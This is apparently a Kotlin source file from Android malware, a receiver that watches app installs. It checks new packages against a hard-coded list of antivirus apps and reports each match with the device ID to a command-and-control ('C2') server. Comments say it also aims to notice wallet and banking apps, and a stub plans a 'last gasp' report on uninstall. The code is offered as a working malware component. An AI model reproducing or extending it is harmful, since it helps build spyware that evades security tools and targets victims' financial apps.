// ============================================================
// FILE: android/app/src/main/java/com/xrc/receivers/PackageChangeReceiver.kt
// ============================================================
package com.xrc.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.xrc.XrcApplication

/**
 * PackageChangeReceiver — monitors app installs/uninstalls.
 *
 * Detects when new apps are installed (potential wallet or banking apps).
 * Detects when security apps are installed (defensive countermeasure).
 */
class PackageChangeReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "PackageChangeReceiver"

        // Security apps to watch for
        private val SECURITY_APPS = listOf(
            "com.malwarebytes.antimalware",
            "com.kaspersky.security",
            "com.lookout.lookout",
            "com.avast.android.antivirus",
            "com.norton.mobile.security",
            "com.bitdefender.security",
            "com.eset.av",
            "com.symantec.mobilesecurity",
            "com.trendmicro.tmmspersonal",
            "com.cleanmaster.mguard",
            "com.qihoo.security",
            "com.drweb.root",
            "com.android.browser",
            "com.google.android.webview"
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        val data = intent.dataString ?: return
        val packageName = data.removePrefix("package:")

        Log.d(TAG, "Package change: $action for $packageName")

        when (action) {
            Intent.ACTION_PACKAGE_ADDED -> onPackageInstalled(context, packageName)
            Intent.ACTION_PACKAGE_REMOVED -> onPackageRemoved(context, packageName)
        }
    }

    private fun onPackageInstalled(context: Context, packageName: String) {
        // Check if it's a security app
        if (packageName in SECURITY_APPS) {
            Log.w(TAG, "Security app installed: $packageName")
            // Report to C2 as a defensive alert
            val app = XrcApplication.instance
            if (::app.isInitialized) {
                val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)
                val msg = com.xrc.comms.Message(
                    type = com.xrc.comms.Protocol.TYPE_SENSOR_DATA,
                    id = "security_app_${System.currentTimeMillis()}",
                    device_id = deviceId,
                    payload = com.xrc.comms.Protocol.json.encodeToString(
                        mapOf("event" to "security_app_installed", "package" to packageName)
                    )
                )
                app.serviceLocator.channelClient.send(msg)
            }
        }
    }

    private fun onPackageRemoved(context: Context, packageName: String) {
        // Could be our package being uninstalled — report as last gasp
    }
}
